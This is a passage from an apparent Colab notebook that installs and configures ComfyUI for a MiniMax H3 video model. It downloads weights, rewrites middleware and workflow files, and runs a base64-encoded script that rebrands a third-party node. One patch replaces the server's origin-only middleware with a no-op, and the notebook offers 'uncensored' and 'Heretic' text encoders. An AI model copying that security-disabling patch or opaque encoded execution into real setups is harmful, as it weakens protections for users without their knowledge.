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"}
for _wfn, _wfb in _orbit_wfs.items():
    _raw = _zlib.decompress(_b64.b64decode(_wfb)).decode("utf-8")
    for _d in ["/content/wf_pool_h3", "/content/ComfyUI/user/default/workflows"]:
        with open(os.path.join(_d, _wfn), "w", encoding="utf-8") as _f:
            _f.write(_raw)

os.makedirs("/content/ComfyUI/models/loras", exist_ok=True)
for _f in os.listdir("/content/lora_pool_h3"):
    if _f.endswith(".safetensors"):
        _dst = os.path.join("/content/ComfyUI/models/loras", _f)
        if not os.path.exists(_dst):
            os.symlink(os.path.join("/content/lora_pool_h3", _f), _dst)

print(f"\n🎉 [基础框架] 极速安装完成 (总耗时 {int(time.time()-t0)} 秒)！现在请在左侧目录选择下方任意一个模型选项（2~6）点击运行！")

In [ ]:
# @title 🎬 2. 文生 + 首尾帧视频选项（官方64G文生底模 + 默认25G CLIP）
import os, subprocess, json
cm_path = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists(cm_path):
    cm_txt = open(cm_path, "r", encoding="utf-8").read()
    if "_OBJ_INFO_CACHE" not in cm_txt:
        open(cm_path, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "body": None, "ct": "application/json"}

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    cn = "/content/ComfyUI/custom_nodes"
    if os.path.isdir(cn):
        try:
            parts.append(",".join(sorted(os.listdir(cn))))
        except Exception:
            pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["body"] is not None:
            return web.Response(body=_OBJ_INFO_CACHE["body"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["body"] = bytes(resp.body)
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    response: web.Response = await handler(request)
    if request.path.startswith("/extensions/"):
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        return response
    if request.path.startswith("/assets/"):
        response.headers["Cache-Control"] = "public, max-age=604800, immutable"
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 2048
        and "Content-Encoding" not in response.headers
        and "gzip" in request.headers.get("Accept-Encoding", "")
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")

if not os.path.exists("/content/ComfyUI/custom_nodes/ComfyUI-MiniMaxH3-TimelineDirector"):
    subprocess.run(["git", "clone", "--depth", "1", "https://github.com/Songssx/ComfyUI-MiniMaxH3-TimelineDirector.git", "/content/ComfyUI/custom_nodes/ComfyUI-MiniMaxH3-TimelineDirector"], check=False)
轻量化CLIP选择 = "25G 官方INT8均衡版 (Comfy-Org原版8位量化 · 99.5%无损精度)"

diff_dir = "/content/ComfyUI/models/diffusion_models"
clip_dir = "/content/ComfyUI/models/text_encoders"
os.makedirs(diff_dir, exist_ok=True)
os.makedirs(clip_dir, exist_ok=True)

target_model = "【64G满血原版-文生图生首尾帧】minimax_h3_fl2va_bf16.safetensors"
if "15G 官方NVFP4" in 轻量化CLIP选择:
    target_clip = "【15G轻量化极速版-CLIP】qwen3vl_32b_minimax_h3_nvfp4_awq.safetensors"
    clip_url = "https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/text_encoders/qwen3vl_32b_minimax_h3_nvfp4_awq.safetensors"
elif "25G 官方INT8" in 轻量化CLIP选择:
    target_clip = "【25G轻量化均衡版-CLIP】qwen3vl_32b_minimax_h3_int8_convrot.safetensors"
    clip_url = "https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/text_encoders/qwen3vl_32b_minimax_h3_int8_convrot.safetensors"
elif "15G Heretic" in 轻量化CLIP选择:
    target_clip = "【15G破限未删减极速版-CLIP】qwen3vl_32b_heretic_minimax_h3_nvfp4.safetensors"
    clip_url = "https://huggingface.co/Momoking/Qwen3-VL-32B-Heretic-MiniMax-H3-NVFP4/resolve/main/qwen3vl_32b_heretic_minimax_h3_nvfp4.safetensors"
else:
    target_clip = "【25G轻量化未删减-C站Remix配套CLIP】minimaxH3Remix_int8ConvrotV06Fixed_txt.safetensors"
    clip_url = "https://huggingface.co/linjian257/qwen3vl_32b_minimax_h3_int8_convrot_uncensored-by-linjian257/resolve/main/qwen3vl_32b_minimax_h3_int8_convrot_uncensored-by-linjian257.safetensors"

print("🧹 正在卸载其他底模与非配套 CLIP，严格只保留当前所选配置（释放磁盘空间）...")
for f in os.listdir(diff_dir):
    if f.endswith(".safetensors") and f != target_model:
        print(f"  🗑️ 已卸载其他底模: {f}")
        os.remove(os.path.join(diff_dir, f))
for f in os.listdir(clip_dir):
    if f.endswith(".safetensors") and f != target_clip:
        print(f"  🗑️ 已卸载非当前 CLIP: {f}")
        os.remove(os.path.join(clip_dir, f))

print(f"⏳ 正在检查/下载 64G 官方文生底模: {target_model} ...")
subprocess.run([
    "aria2c", "-c", "-x", "16", "-s", "16", "--file-allocation=none",
    "-d", diff_dir, "-o", target_model,
    "https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/diffusion_models/minimax_h3_fl2va_bf16.safetensors"
], check=True)

print(f"⏳ 正在检查/下载官方配套 CLIP: {target_clip} ...")
subprocess.run([
    "aria2c", "-c", "-x", "16", "-s", "16", "--file-allocation=none",
    "-d", clip_dir, "-o", target_clip, clip_url
], check=True)

os.makedirs("/content/lora_pool_h3", exist_ok=True)
os.makedirs("/content/lora_pool_qwen", exist_ok=True)
_lora_active = "/content/ComfyUI/models/loras"
os.makedirs(_lora_active, exist_ok=True)
for _f in list(os.listdir(_lora_active)):
    _p = os.path.join(_lora_active, _f)
    if os.path.islink(_p):
        os.unlink(_p)
    elif os.path.isfile(_p) and _f.endswith(".safetensors"):
        _pool = "/content/lora_pool_qwen" if ("千问" in _f or "Qwen" in _f or "qwen" in _f or "Anime2Real" in _f or "2anime" in _f) else "/content/lora_pool_h3"
        os.replace(_p, os.path.join(_pool, _f))
for _f in os.listdir("/content/lora_pool_h3"):
    if _f.endswith(".safetensors"):
        os.symlink(os.path.join("/content/lora_pool_h3", _f), os.path.join(_lora_active, _f))
print("🧹 已切换为【H3视频专属LoRA与工作流配置】")

wf_dir = "/content/ComfyUI/user/default/workflows"
os.makedirs(wf_dir, exist_ok=True)
os.makedirs("/content/wf_pool_h3", exist_ok=True)
os.makedirs("/content/wf_pool_qwen", exist_ok=True)
for _wf in list(os.listdir(wf_dir)):
    if _wf.endswith(".json") and ("qwen" in _wf.lower() or "千问" in _wf):
        os.replace(os.path.join(wf_dir, _wf), os.path.join("/content/wf_pool_qwen", _wf))
import shutil as _sh
for _wf in os.listdir("/content/wf_pool_h3"):
    if _wf.endswith(".json") and not os.path.exists(os.path.join(wf_dir, _wf)):
        _sh.copy2(os.path.join("/content/wf_pool_h3", _wf), os.path.join(wf_dir, _wf))
if not [f for f in os.listdir(wf_dir) if f.endswith(".json")]:
    import base64, zlib
    _wfs = json.loads(zlib.decompress(base64.b64decode("...")).decode("utf-8"))
    for _fn, _wdata in _wfs.items():
        json.dump(_wdata, open(os.path.join(wf_dir, _fn), "w", encoding="utf-8"), ensure_ascii=False, indent=2)
for _target_wdir in [wf_dir, "/content/wf_pool_h3"]:
  if os.path.exists(_target_wdir):
    for wfname in sorted(os.listdir(_target_wdir)):
        if wfname.endswith(".json") and not ("qwen" in wfname.lower() or "千问" in wfname):
            wpath = os.path.join(_target_wdir, wfname)
            try:
                wf = json.load(open(wpath, encoding="utf-8"))
                all_nodes = list(wf.get("nodes", []))
                for sg in wf.get("definitions", {}).get("subgraphs", []):
                    all_nodes.extend(sg.get("nodes", []))
                for n in all_nodes:
                    ntype = n.get("type", "")
                    wv = n.get("widgets_values")
                    if ntype == "UNETLoader" and isinstance(wv, list) and len(wv) >= 1:
                        wv[0] = target_model
                    elif ntype == "CLIPLoader" and isinstance(wv, list) and len(wv) >= 1:
                        wv[0] = target_clip
                    elif ntype == "FeiHouEasyH3Loader" and isinstance(wv, list) and len(wv) >= 3:
                        wv[0], wv[1], wv[2] = target_model, target_model, target_clip
                    elif ntype == "FeiHouEasyH3RemixLoader" and isinstance(wv, list) and len(wv) >= 2:
                        wv[0], wv[1] = target_model, target_clip
                    elif ntype == "4c314f31-ecda-4b08-ae98-faaba1bf613f" and isinstance(wv, list) and len(wv) >= 7:
                        wv[5], wv[6] = target_model, target_clip
                json.dump(wf, open(wpath, "w", encoding="utf-8"), ensure_ascii=False, indent=2)
            except Exception:
                pass

import time, socket, re, urllib.request, gzip, shutil, pathlib
from google.colab import output
from IPython.display import display, HTML

os.chdir("/content/ComfyUI")

s_path = "/content/ComfyUI/server.py"
if os.path.exists(s_path):
    txt = open(s_path, "r", encoding="utf-8").read()
    if "return await handler(request) # patched" not in txt:
        txt = txt.replace(
            "def create_origin_only_middleware():",
            "def create_origin_only_middleware():\n    from aiohttp import web\n    @web.middleware\n    async def _noop(request, handler):\n        return await handler(request) # patched\n    return _noop\ndef _old_origin():"
        )
        open(s_path, "w", encoding="utf-8").write(txt)

cm_path = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists(cm_path):
    cm_txt = open(cm_path, "r", encoding="utf-8").read()
    if "max-age=604800" not in cm_txt or '.endswith(".js")' in cm_txt:
        open(cm_path, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
ONE_DAY: int = 86400
IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    response: web.Response = await handler(request)
    if request.path.startswith("/extensions/"):
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        return response
    if request.path.startswith("/assets/"):
        response.headers["Cache-Control"] = "public, max-age=604800, immutable"
        return response
    if request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    return response
""")
try:
    import comfyui_frontend_package
    fe_root = pathlib.Path(comfyui_frontend_package.__file__).parent
    for p in list(fe_root.rglob("*.js")) + list(fe_root.rglob("*.css")):
        gz = pathlib.Path(str(p) + ".gz")
        if not gz.exists() and p.is_file():
            with open(p, "rb") as f_in, gzip.open(gz, "wb", compresslevel=6) as f_out:
                shutil.copyfileobj(f_in, f_out)
except Exception:
    pass


try:
    import comfy_kitchen.tensor.int8 as _ck_int8
    _int8_p = pathlib.Path(_ck_int8.__file__)
    _int8_s = _int8_p.read_text(encoding="utf-8")
    if "if qdata.dtype != torch.int8:" not in _int8_s:
        _int8_s = _int8_s.replace(
            "    def dequantize(cls, qdata: torch.Tensor, params: Params) -> torch.Tensor:",
            "    def dequantize(cls, qdata: torch.Tensor, params: Params) -> torch.Tensor:\n        if qdata.dtype != torch.int8:\n            return qdata.to(params.orig_dtype)",
            1
        )
        _int8_s = _int8_s.replace(
            "    def dequantize_embedding(cls, qdata: torch.Tensor, params: Params, indices: torch.Tensor) -> torch.Tensor:",
            "    def dequantize_embedding(cls, qdata: torch.Tensor, params: Params, indices: torch.Tensor) -> torch.Tensor:\n        if qdata.dtype != torch.int8:\n            return torch.nn.functional.embedding(indices, qdata.to(device=indices.device, dtype=params.orig_dtype))",
            1
        )
        _int8_s = _int8_s.replace(
            "if not isinstance(weight, QuantizedTensor) or weight._layout_cls != cls.__name__:",
            "if not isinstance(weight, QuantizedTensor) or weight._layout_cls != cls.__name__ or weight._qdata.dtype != torch.int8:"
        )
        _int8_s = _int8_s.replace(
            'if not isinstance(weight, QuantizedTensor) or weight._layout_cls != "TensorWiseINT8Layout":',
            'if not isinstance(weight, QuantizedTensor) or weight._layout_cls != "TensorWiseINT8Layout" or weight._qdata.dtype != torch.int8:'
        )
        _int8_p.write_text(_int8_s, encoding="utf-8")
except Exception:
    pass

subprocess.run("echo CmltcG9ydCBwYXRobGliLCBqc29uLCBnemlwLCBzaHV0aWwsIG9zCgpiYXNlX2RpciA9IHBhdGhsaWIuUGF0aCgiL2NvbnRlbnQvQ29tZnlVSS9jdXN0b21fbm9kZXMvQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyIpCgojIDEuIENsZWFuIGZlaWhvdV9lYXN5X2gzX3VpLmpzOiBoaWRlIHByb21wdCBvcHRpbWl6ZXIgd2lkZ2V0cyAmIGJ1dHRvbiwgcmVtb3ZlIEZlaUhvdSBicmFuZGluZwp1aV9qcyA9IGJhc2VfZGlyIC8gIndlYiIgLyAiZmVpaG91X2Vhc3lfaDNfdWkuanMiCmlmIHVpX2pzLmV4aXN0cygpOgogICAgdHh0ID0gdWlfanMucmVhZF90ZXh0KGVuY29kaW5nPSJ1dGYtOCIpCiAgICB0eHQgPSB0eHQucmVwbGFjZSgKICAgICAgICAnc2V0Q29uZGl0aW9uYWxXaWRnZXRWaXNpYmxlKG5vZGUsIGdldFdpZGdldChub2RlLCAicHJvbXB0X29wdGltaXplcl9lbmFibGVkIiksIGFkdmFuY2VkLCB7IGFkanVzdEhlaWdodCB9KSwnLAogICAgICAgICdzZXRDb25kaXRpb25hbFdpZGdldFZpc2libGUobm9kZSwgZ2V0V2lkZ2V0KG5vZGUsICJwcm9tcHRfb3B0aW1pemVyX2VuYWJsZWQiKSwgZmFsc2UsIHsgYWRqdXN0SGVpZ2h0IH0pLCcKICAgICkKICAgIHR4dCA9IHR4dC5yZXBsYWNlKAogICAgICAgICdzZXRDb25kaXRpb25hbFdpZGdldFZpc2libGUobm9kZSwgZ2V0V2lkZ2V0KG5vZGUsICJwcm9tcHRfb3B0aW1pemVyX3Byb3ZpZGVyIiksIG9wdGltaXplckVuYWJsZWQsIHsgYWRqdXN0SGVpZ2h0IH0pLCcsCiAgICAgICAgJ3NldENvbmRpdGlvbmFsV2lkZ2V0VmlzaWJsZShub2RlLCBnZXRXaWRnZXQobm9kZSwgInByb21wdF9vcHRpbWl6ZXJfcHJvdmlkZXIiKSwgZmFsc2UsIHsgYWRqdXN0SGVpZ2h0IH0pLCcKICAgICkKICAgIHR4dCA9IHR4dC5yZXBsYWNlKAogICAgICAgICdzZXRDb25kaXRpb25hbFdpZGdldFZpc2libGUobm9kZSwgZ2V0V2lkZ2V0KG5vZGUsICJwcm9tcHRfb3B0aW1pemVyX3NjZW5lX2d1aWRlIiksIG9wdGltaXplckVuYWJsZWQsIHsgYWRqdXN0SGVpZ2h0IH0pLCcsCiAgICAgICAgJ3NldENvbmRpdGlvbmFsV2lkZ2V0VmlzaWJsZShub2RlLCBnZXRXaWRnZXQobm9kZSwgInByb21wdF9vcHRpbWl6ZXJfc2NlbmVfZ3VpZGUiKSwgZmFsc2UsIHsgYWRqdXN0SGVpZ2h0IH0pLCcKICAgICkKICAgIHR4dCA9IHR4dC5yZXBsYWNlKAogICAgICAgICdlZGl0b3JUb29scy5hcHBlbmQob3B0aW1pemVCdXR0b24sIHZpZXdCdXR0b24pOycsCiAgICAgICAgJ29wdGltaXplQnV0dG9uLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7IGVkaXRvclRvb2xzLmFwcGVuZCh2aWV3QnV0dG9uKTsnCiAgICApCiAgICB0eHQgPSB0eHQucmVwbGFjZSgKICAgICAgICAnc2V0V2lkZ2V0SW5wdXQoInByb21wdF9vcHRpbWl6ZXJfZW5hYmxlZCIsIGFzQm9vbGVhbihnZXRXaWRnZXRWYWx1ZShub2RlLCAicHJvbXB0X29wdGltaXplcl9lbmFibGVkIiwgZmFsc2UpKSk7JywKICAgICAgICAnc2V0V2lkZ2V0SW5wdXQoInByb21wdF9vcHRpbWl6ZXJfZW5hYmxlZCIsIGZhbHNlKTsnCiAgICApCiAgICB0eHQgPSB0eHQucmVwbGFjZSgnbWFpblRpdGxlOiAiQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyInLCAnbWFpblRpdGxlOiAiTWluaU1heC1IMyDlhajog73lt6XkvZzlj7AiJykKICAgIHR4dCA9IHR4dC5yZXBsYWNlKCdGZWlIb3UgRWFzeSBIMyBcXHU1MmEwXFx1OGY3ZFxcdTU2NjgnLCAnTWluaU1heC1IMyDkuIDkvZPljJbliqDovb3lmagnKQogICAgdHh0ID0gdHh0LnJlcGxhY2UoJ0ZlaUhvdSBFYXN5IEgzIFJlbWl4XFx1NTJhMFxcdThmN2RcXHU1NjY4JywgJ01pbmlNYXgtSDMg5LqM5ZCI5LiA5Yqg6L295ZmoJykKICAgIHR4dCA9IHR4dC5yZXBsYWNlKCdGZWlIb3UgRWFzeSBIMyBcXHU4ZjkzXFx1NTFmYScsICdNaW5pTWF4LUgzIOmfs+eUu+WQjOatpei+k+WHuicpCiAgICB0eHQgPSB0eHQucmVwbGFjZSgnY2F0ZWdvcnk6ICJGZWlIb3UgRWFzeSBIMyInLCAnY2F0